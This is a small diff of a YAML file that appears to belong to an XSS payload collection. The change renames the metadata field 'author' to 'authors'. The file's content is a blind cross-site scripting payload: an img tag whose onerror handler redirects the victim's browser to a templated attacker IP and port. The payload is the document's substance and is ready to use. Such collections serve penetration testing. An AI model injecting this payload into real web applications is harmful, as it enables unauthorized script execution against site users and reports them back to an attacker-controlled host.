@@ -3,7 +3,7 @@ metadata:
   filename: "xss-blind-img-onerror-poc-callback.yaml"
   tags: ["web", "xss"]
   created: "2025-03-29"
-  author: "Unknown"
+  authors: ["Unknown"]
 
 content: |
   <img src=x onerror="document.location='http://{{ attacker_ip }}:{{ delivery_outbound_port }}/test'"/>
